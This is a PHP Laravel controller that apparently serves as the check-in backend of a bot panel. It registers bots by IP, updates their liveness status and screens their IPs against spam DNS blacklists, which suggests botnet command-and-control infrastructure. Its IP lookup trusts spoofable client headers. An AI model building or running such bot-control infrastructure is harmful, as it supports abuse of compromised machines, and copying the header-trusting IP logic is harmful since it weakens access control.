<?php

namespace App\Http\Controllers;

use App\Bots;
use App\PannelSettings;
use Carbon\Carbon;
use Illuminate\Http\Request;

class CommandController extends Controller
{
    public function index(Request $request)
    {
        $ip  = $this->getRealIP();
        $bot = Bots::where(['ip' => $ip])->first();
        $pannelSettings = PannelSettings::whereId(1)->first();

        if (isset($bot)) {
            if ($bot->ban == 1) {
                echo 'Your IP adress (' . $ip . ') was blocked!';
                exit;
            }
        }else{
            abort(404);
        }

            if ($pannelSettings->checkBlackList != 'noNeedCheckBlack') {
                if (!isset($bot->blacklistdate)) {
                    if ($this->IpBlackListTest($ip) > 0) {
                        $bot->black = 1;
                        $bot->blacklistdate = Carbon::now('Europe/Kiev');
                        $bot->save();
                        echo '0';
                        exit();
                    } else {
                        $bot->black = 0;
                        $bot->blacklistdate = Carbon::now('Europe/Kiev');
                        $bot->save();
                    }
                } else {
                    if (Carbon::parse($bot->blacklistdate,'Europe/Kiev')->diffInHours(Carbon::now('Europe/Kiev')) > 0) {
                        if ($this->IpBlackListTest($ip) > 0) {
                            $bot->black = 1;
                            $bot->blacklistdate = Carbon::now('Europe/Kiev');
                            $bot->save();
                            echo '0';
                            exit();
                        } else {
                            $bot->black = 0;
                            $bot->blacklistdate = Carbon::now('Europe/Kiev');
                            $bot->save();
                        }
                    } else {
                        if (isset($bot->ban)&&$bot->ban) {
                            echo '0';
                            exit();
                        }
                    }
                }
            }

    }

    function getRealIP()
    {
        if ( ! empty($_SERVER['HTTP_X_REAL_IP'])) {
            $ip = $_SERVER['HTTP_X_REAL_IP'];
        } elseif ( ! empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif ( ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        return $ip;
    }

    public function postIndex(Request $request)
    {
        $ip     = $this->getRealIP();
        $bot    = Bots::where(['ip' => $ip])->first();
        $status = $request->get('status');
        if (isset($bot)) {
            if ($bot->ban == 1) {
                echo 'Your IP adress (' . $ip . ') was blocked!';
                exit;
            }
            if ($status == 0) {
                $bot->bot_status = 2;
                $bot->life       = 1;
                $bot->otk        = 0;
                $bot->save();
            } else {
                $bot->life = 1;
                $bot->otk  = 0;
                $bot->save();
            }
        } else {
            Bots::create([
                'ip'   => $ip,
            ]);
        }
    }

    function IpBlackListTest($ip)
    {

        $countBans = 0;

        $baracuda  = "b.barracudacentral.org";
        $spamHaus  = "zen.spamhaus.org";
        $abuseAt   = "cbl.abuseat.org";
        $spamHaus2 = "xbl.spamhaus.org";

        $urlb  = implode(".", array_reverse(explode(".", $ip))) . "." . $baracuda;
        $urls  = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus;
        $urla  = implode(".", array_reverse(explode(".", $ip))) . "." . $abuseAt;
        $urls2 = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus2;

        $record = dns_get_record($urlb);
        $countBans += count($record);
        $record = dns_get_record($urls);
        $countBans += count($record);
        $record = dns_get_record($urls2);
        $countBans += count($record);
        $record = dns_get_record($urla);
        $countBans += count($record);

        return $countBans;
    }

}
